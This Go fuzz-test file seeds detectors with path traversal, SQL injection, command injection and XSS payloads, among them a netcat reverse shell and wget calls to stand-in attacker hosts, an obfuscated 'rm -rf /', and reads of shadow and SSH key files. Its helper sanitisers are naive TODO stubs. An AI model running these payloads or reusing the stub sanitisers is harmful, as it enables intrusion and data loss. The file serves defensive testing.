package shared

import (
	"strings"
	"testing"
)

// FuzzPathTraversalValidation tests for path traversal vulnerabilities
func FuzzPathTraversalValidation(f *testing.F) {
	// Comprehensive path traversal attack vectors
	seeds := []string{
		// Basic directory traversal
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\config\\sam",
		"....//....//....//etc//passwd",
		"..../..../..../etc/passwd",
		
		// Encoded path traversal
		"..%2f..%2f..%2fetc%2fpasswd",
		"..%5c..%5c..%5cwindows%5csystem32",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		"..%252f..%252f..%252fetc%252fpasswd", // double encoding
		
		// Unicode path traversal
		"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
		"..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
		
		// Null byte injection
		"safe.txt\x00../../../etc/passwd",
		"file.txt\x00\x00..\\..\\..\\windows\\system32",
		
		// Long path names (buffer overflow)
		strings.Repeat("../", 1000) + "etc/passwd",
		strings.Repeat("..\\", 500) + "windows\\system32",
		
		// Mixed separators
		"..\\../..\\../etc/passwd",
		"../..\\../windows/system32",
		
		// Absolute paths
		"/etc/passwd",
		"\\windows\\system32\\config",
		"C:\\windows\\system32",
		
		// Home directory traversal
		"~/../../../etc/passwd",
		"~/.ssh/id_rsa",
		"${HOME}/../../../etc/passwd",
		
		// Valid paths (should pass)
		"config/app.conf",
		"data/input.txt",
		"./local/file.txt",
		"subfolder/document.pdf",
		"",
	}
	
	for _, seed := range seeds {
		f.Add(seed)
	}
	
	f.Fuzz(func(t *testing.T, path string) {
		// Test path traversal detection
		isTraversal := detectPathTraversal(path)
		normalized := normalizePath(path)
		isNormalizedSafe := isSafePath(normalized)
		
		// Path traversal patterns should be detected
		if containsObviousTraversal(path) && !isTraversal {
			t.Errorf("Failed to detect path traversal in: %s", path)
		}
		
		// Normalized paths should be safe
		if isNormalizedSafe && containsObviousTraversal(normalized) {
			t.Errorf("Normalization failed to make path safe: %s -> %s", path, normalized)
		}
		
		// Test encoding detection
		if containsEncodedTraversal(path) {
			decoded := decodePathSafely(path)
			if detectPathTraversal(decoded) != true {
				t.Errorf("Failed to detect encoded path traversal: %s -> %s", path, decoded)
			}
		}
		
		// Test length validation
		if len(path) > 0 {
			isValidLength := validatePathLength(path)
			_ = isValidLength
		}
	})
}

// FuzzSQLInjectionDetection tests for SQL injection vulnerabilities
func FuzzSQLInjectionDetection(f *testing.F) {
	seeds := []string{
		// Classic SQL injection
		"'; DROP TABLE users; --",
		"' OR '1'='1",
		"' OR 1=1 --",
		"admin'--",
		"admin' /*",
		
		// Union-based injection
		"' UNION SELECT password FROM users --",
		"1' UNION ALL SELECT NULL,NULL,password FROM admin --",
		"' UNION SELECT @@version --",
		
		// Boolean-based blind injection
		"' AND (SELECT COUNT(*) FROM users) > 0 --",
		"' AND 1=1 --",
		"' AND 1=2 --",
		"' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 65 --",
		
		// Time-based blind injection
		"'; WAITFOR DELAY '00:00:05' --",
		"' OR SLEEP(5) --",
		"'; SELECT pg_sleep(5) --",
		"' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
		
		// Error-based injection
		"' AND ExtractValue(rand(), concat(0x3a, version())) --",
		"' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT user()),0x3a,FLOOR(RAND()*2))x FROM dual GROUP BY x)a) --",
		
		// Second-order injection
		"admin'; UPDATE users SET password='hacked' WHERE username='admin' --",
		
		// NoSQL injection
		"'; return db.users.find(); var injected='",
		"{\"$gt\": \"\"}",
		"{\"$ne\": null}",
		"{\"username\": {\"$regex\": \".*\"}}",
		
		// PostgreSQL specific
		"'; COPY users TO '/tmp/output.txt' --",
		"'; CREATE OR REPLACE FUNCTION shell(text) RETURNS text LANGUAGE plpythonu AS 'import os; return os.popen(plpy.args[0]).read()' --",
		
		// MySQL specific
		"' INTO OUTFILE '/tmp/output.txt' --",
		"'; LOAD_FILE('/etc/passwd') --",
		
		// MSSQL specific
		"'; EXEC xp_cmdshell('dir') --",
		"'; EXEC sp_configure 'show advanced options',1 --",
		
		// SQLite specific
		"'; ATTACH DATABASE '/tmp/evil.db' AS evil --",
		
		// Advanced payloads
		"'; DECLARE @cmd VARCHAR(8000); SET @cmd = 'net user'; EXEC xp_cmdshell @cmd --",
		"' AND 1=(SELECT TOP 1 name FROM sysobjects WHERE xtype='U') --",
		
		// Encoded injections
		"%27%20OR%201%3D1%20--",
		"0x27204f522031%3d312d2d",
		"'; exec(char(0x6e,0x65,0x74,0x20,0x75,0x73,0x65,0x72,0x20,0x61,0x64,0x6d,0x69,0x6e,0x20,0x70,0x61,0x73,0x73)) --",
		
		// Unicode SQL injection
		"'; DROP TABLE users; --",
		"＇ ＯＲ １＝１ --",
		
		// Valid inputs (should pass)
		"admin",
		"user123",
		"normal_value",
		"test@example.com",
		"",
	}
	
	for _, seed := range seeds {
		f.Add(seed)
	}
	
	f.Fuzz(func(t *testing.T, input string) {
		// Test SQL injection detection
		isSQLInjection := detectSQLInjection(input)
		sanitized := sanitizeSQLInput(input)
		isStillUnsafe := detectSQLInjection(sanitized)
		
		// Known SQL injection patterns should be detected
		if containsObviousSQLInjection(input) && !isSQLInjection {
			t.Errorf("Failed to detect SQL injection in: %s", input)
		}
		
		// Sanitized input should be safe
		if isStillUnsafe {
			t.Errorf("Sanitization failed to remove SQL injection: %s -> %s", input, sanitized)
		}
		
		// Test parameterized query preparation
		if containsSQLKeywords(input) {
			prepared := prepareParameterizedQuery(input)
			if containsUnsafeSQL(prepared) {
				t.Errorf("Parameterized query preparation failed: %s", input)
			}
		}
	})
}

// FuzzCommandInjectionDetection tests for command injection vulnerabilities
func FuzzCommandInjectionDetection(f *testing.F) {
	seeds := []string{
		// Basic command injection
		"; rm -rf /",
		"| cat /etc/passwd",
		"&& malicious_command",
		"|| evil_command",
		
		// Command substitution
		"$(whoami)",
		"`id`",
		"${malicious}",
		"$(cat /etc/shadow)",
		"`rm -rf /`",
		
		// Redirection attacks
		"> /etc/passwd",
		"< /dev/zero",
		">> ~/.bashrc",
		"2>&1 | evil",
		
		// Background execution
		"evil &",
		"nohup evil_process &",
		
		// Multi-command execution
		"cmd1; cmd2; evil",
		"good && bad",
		"test || malicious",
		
		// Shell metacharacters
		"cmd$IFS$evil",
		"cmd${IFS}evil",
		"cmd\tevil",
		"cmd\nevil",
		
		// Environment variable injection
		"$PATH/evil",
		"${HOME}/../evil",
		"$USER=attacker",
		
		// Network-based injection
		"wget http://evil.com/malware",
		"curl -X POST attacker.com",
		"nc -e /bin/sh attacker.com 4444",
		
		// PowerShell (Windows)
		"powershell -c 'Remove-Item -Recurse C:\\'",
		"cmd /c 'del /f /s /q C:\\*'",
		
		// Script execution
		"bash -c 'evil'",
		"sh -c 'malicious'",
		"python -c 'import os; os.system(\"evil\")'",
		
		// Encoding evasion
		"$(echo 'cm0gLXJmIC8K' | base64 -d | sh)", // echo 'rm -rf /' | base64
		"`printf \"\\x72\\x6d\\x20\\x2d\\x72\\x66\\x20\\x2f\"`", // rm -rf /
		
		// Unicode command injection
		"；rm -rf /", // Unicode semicolon
		"｜cat /etc/passwd", // Unicode pipe
		
		// Null byte injection
		"safe\x00; rm -rf /",
		"command\x00evil",
		
		// Valid commands (should pass)
		"ls -la",
		"grep pattern file.txt",
		"echo 'hello world'",
		"find /home -name '*.txt'",
		"",
	}
	
	for _, seed := range seeds {
		f.Add(seed)
	}
	
	f.Fuzz(func(t *testing.T, command string) {
		// Test command injection detection
		isInjection := detectCommandInjection(command)
		sanitized := sanitizeCommandInput(command)
		isStillUnsafe := detectCommandInjection(sanitized)
		
		// Known injection patterns should be detected
		if containsObviousCommandInjection(command) && !isInjection {
			t.Errorf("Failed to detect command injection in: %s", command)
		}
		
		// Sanitized commands should be safe
		if isStillUnsafe {
			t.Errorf("Sanitization failed to remove command injection: %s -> %s", command, sanitized)
		}
		
		// Test safe command execution preparation
		args := parseCommandSafely(command)
		for _, arg := range args {
			if containsMetachars(arg) {
				t.Errorf("Command parsing left metacharacters in argument: %s", arg)
			}
		}
	})
}

// FuzzXSSDetection tests for Cross-Site Scripting vulnerabilities
func FuzzXSSDetection(f *testing.F) {
	seeds := []string{
		// Basic script injection
		"<script>alert(1)</script>",
		"<script>alert('XSS')</script>",
		"<script>alert(document.cookie)</script>",
		
		// Event handler injection
		"<img src=x onerror=alert(1)>",
		"<div onclick=alert(1)>",
		"<input onfocus=alert(1) autofocus>",
		"<body onload=alert(1)>",
		
		// JavaScript protocol
		"javascript:alert(1)",
		"javascript:alert(document.cookie)",
		"javascript:eval('malicious')",
		
		// Data URI injection
		"data:text/html,<script>alert(1)</script>",
		"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
		
		// SVG-based XSS
		"<svg onload=alert(1)>",
		"<svg><script>alert(1)</script></svg>",
		
		// Style-based injection
		"<style>@import'javascript:alert(1)'</style>",
		"<div style=background:url(javascript:alert(1))>",
		
		// Form injection
		"<form action=javascript:alert(1)><input type=submit>",
		"<input type=image src=x onerror=alert(1)>",
		
		// Meta refresh injection
		"<meta http-equiv=refresh content=0;url=javascript:alert(1)>",
		
		// Comment injection
		"<!--<script>alert(1)</script>-->",
		"<![CDATA[<script>alert(1)</script>]]>",
		
		// Attribute injection
		"\"><script>alert(1)</script>",
		"'><script>alert(1)</script>",
		"' onclick=alert(1) '",
		
		// Filter evasion
		"<ScRiPt>alert(1)</ScRiPt>",
		"<script>al\\u0065rt(1)</script>",
		"<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
		
		// Expression injection (IE)
		"<div style=width:expression(alert(1))>",
		
		// Template injection
		"{{7*7}}",
		"${7*7}",
		"<%= 7*7 %>",
		"{{constructor.constructor('alert(1)')()}}",
		
		// Unicode-based XSS
		"<script>alert\u0028\u0031\u0029</script>",
		"<script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</script>",
		
		// Encoded payloads
		"%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
		"&lt;script&gt;alert(1)&lt;/script&gt;",
		
		// Valid content (should pass)
		"<p>Normal paragraph</p>",
		"<a href='http://example.com'>Link</a>",
		"<img src='photo.jpg' alt='Photo'>",
		"",
	}
	
	for _, seed := range seeds {
		f.Add(seed)
	}
	
	f.Fuzz(func(t *testing.T, input string) {
		// Test XSS detection
		isXSS := detectXSS(input)
		sanitized := sanitizeHTMLInput(input)
		isStillUnsafe := detectXSS(sanitized)
		
		// Known XSS patterns should be detected
		if containsObviousXSS(input) && !isXSS {
			t.Errorf("Failed to detect XSS in: %s", input)
		}
		
		// Sanitized input should be safe
		if isStillUnsafe {
			t.Errorf("Sanitization failed to remove XSS: %s -> %s", input, sanitized)
		}
		
		// Test content security policy validation
		if containsJavaScript(input) {
			isCSPSafe := validateCSPCompliance(input)
			if !isCSPSafe {
				t.Errorf("Input violates CSP: %s", input)
			}
		}
	})
}

// Helper functions for validation (implementations should be added to appropriate packages)

func detectPathTraversal(path string) bool {
	patterns := []string{"../", "..\\", "....//", "....\\\\", "%2e%2e", "..%2f", "..%5c"}
	lower := strings.ToLower(path)
	for _, pattern := range patterns {
		if strings.Contains(lower, pattern) {
			return true
		}
	}
	return false
}

func containsObviousTraversal(path string) bool {
	return strings.Contains(path, "..") || strings.Contains(path, "/etc/") || strings.Contains(path, "\\windows\\")
}

func normalizePath(path string) string {
	// TODO: Implement path normalization
	return strings.ReplaceAll(path, "..", "")
}

func isSafePath(path string) bool {
	return !detectPathTraversal(path)
}

func containsEncodedTraversal(path string) bool {
	return strings.Contains(path, "%2e") || strings.Contains(path, "%2f") || strings.Contains(path, "%5c")
}

func decodePathSafely(path string) string {
	// TODO: Implement safe URL decoding
	return path
}

func validatePathLength(path string) bool {
	return len(path) <= 512
}

func detectSQLInjection(input string) bool {
	patterns := []string{"'", "\"", ";", "--", "/*", "*/", "union", "select", "insert", "update", "delete", "drop"}
	lower := strings.ToLower(input)
	for _, pattern := range patterns {
		if strings.Contains(lower, pattern) {
			return true
		}
	}
	return false
}

func containsObviousSQLInjection(input string) bool {
	return strings.Contains(strings.ToLower(input), "drop table") || 
		   strings.Contains(input, "' or '1'='1") ||
		   strings.Contains(strings.ToLower(input), "union select")
}

func sanitizeSQLInput(input string) string {
	// TODO: Implement SQL input sanitization
	input = strings.ReplaceAll(input, "'", "''")
	input = strings.ReplaceAll(input, "\"", "\"\"")
	return input
}

func containsSQLKeywords(input string) bool {
	keywords := []string{"select", "insert", "update", "delete", "drop", "union", "where"}
	lower := strings.ToLower(input)
	for _, keyword := range keywords {
		if strings.Contains(lower, keyword) {
			return true
		}
	}
	return false
}

func prepareParameterizedQuery(input string) string {
	// TODO: Implement parameterized query preparation
	return input
}

func containsUnsafeSQL(query string) bool {
	return detectSQLInjection(query)
}

func detectCommandInjection(command string) bool {
	patterns := []string{";", "|", "&", "$(", "`", "&&", "||", ">", "<", "$"}
	for _, pattern := range patterns {
		if strings.Contains(command, pattern) {
			return true
		}
	}
	return false
}

func containsObviousCommandInjection(command string) bool {
	return strings.Contains(command, "rm -rf") || strings.Contains(command, "; rm ") || strings.Contains(command, "| cat /etc/")
}

func sanitizeCommandInput(command string) string {
	// TODO: Implement command input sanitization
	dangerous := []string{";", "|", "&", "$(", "`", "&&", "||", ">", "<"}
	for _, char := range dangerous {
		command = strings.ReplaceAll(command, char, "")
	}
	return command
}

func parseCommandSafely(command string) []string {
	// TODO: Implement safe command parsing
	return strings.Fields(command)
}

func containsMetachars(arg string) bool {
	metacharacters := []string{";", "|", "&", "$", "`", "<", ">", "(", ")", "*", "?"}
	for _, meta := range metacharacters {
		if strings.Contains(arg, meta) {
			return true
		}
	}
	return false
}

func detectXSS(input string) bool {
	patterns := []string{"<script", "javascript:", "onerror=", "onclick=", "onload=", "<svg", "data:text/html"}
	lower := strings.ToLower(input)
	for _, pattern := range patterns {
		if strings.Contains(lower, pattern) {
			return true
		}
	}
	return false
}

func containsObviousXSS(input string) bool {
	return strings.Contains(strings.ToLower(input), "<script>") || 
		   strings.Contains(strings.ToLower(input), "javascript:alert") ||
		   strings.Contains(strings.ToLower(input), "onerror=alert")
}

func sanitizeHTMLInput(input string) string {
	// TODO: Implement HTML input sanitization
	input = strings.ReplaceAll(input, "<script>", "")
	input = strings.ReplaceAll(input, "</script>", "")
	input = strings.ReplaceAll(input, "javascript:", "")
	return input
}

func containsJavaScript(input string) bool {
	return strings.Contains(strings.ToLower(input), "javascript:") || 
		   strings.Contains(strings.ToLower(input), "<script")
}

func validateCSPCompliance(input string) bool {
	// TODO: Implement CSP compliance validation
	return !containsJavaScript(input)
}